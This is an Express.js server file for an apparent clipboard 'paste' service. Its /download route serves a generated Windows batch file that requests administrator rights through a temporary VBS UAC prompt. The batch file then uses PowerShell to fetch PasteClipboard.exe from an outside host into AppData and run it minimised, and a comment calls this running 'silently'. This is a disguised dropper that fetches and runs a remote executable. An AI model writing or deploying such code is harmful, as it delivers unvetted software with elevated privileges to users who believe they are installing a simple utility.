const express = require('express');
const cors = require('cors');
const path = require('path');

const app = express();
const port = process.env.PORT || 3000;

// Enable CORS for all routes
app.use(cors());

// Serve static files from the public directory
app.use(express.static('public'));

// Main route that serves the paste functionality page
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Direct download endpoint for the batch file
app.get('/download', (req, res) => {
    res.setHeader('Content-Type', 'application/x-bat');
    res.setHeader('Content-Disposition', 'attachment; filename=run_paste.bat');
    
    // Generate a batch file content that runs silently
    const batchContent = `@echo off
>nul 2>&1 "%SYSTEMROOT%\\system32\\cacls.exe" "%SYSTEMROOT%\\system32\\config\\system"
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\\getadmin.vbs"
    echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\\getadmin.vbs"
    "%temp%\\getadmin.vbs"
    exit /B

:gotAdmin
    if exist "%temp%\\getadmin.vbs" ( del "%temp%\\getadmin.vbs" )
    pushd "%CD%"
    CD /D "%~dp0"

:: Set paths
set "exeUrl=https://pspaste-service.onrender.com/PasteClipboard.exe"
set "localPath=%APPDATA%\\PSPaste\\PasteClipboard.exe"

:: Create directory if it doesn't exist
if not exist "%APPDATA%\\PSPaste" mkdir "%APPDATA%\\PSPaste"

:: Download the file if it doesn't exist
if not exist "%localPath%" (
    powershell -Command "(New-Object Net.WebClient).DownloadFile('%exeUrl%', '%localPath%')"
)

:: Execute silently
start /min "" "%localPath%"
exit`;

    res.send(batchContent);
});

// Route to serve the executable
app.get('/PasteClipboard.exe', (req, res) => {
    res.setHeader('Content-Type', 'application/x-msdownload');
    res.setHeader('Content-Disposition', 'attachment; filename=PasteClipboard.exe');
    res.sendFile(path.join(__dirname, 'public', 'PasteClipboard.exe'));
});

// Health check endpoint
app.get('/health', (req, res) => {
    res.json({ status: 'healthy' });
});

app.listen(port, () => {
    console.log(`Server running at http://localhost:${port}`);
}); 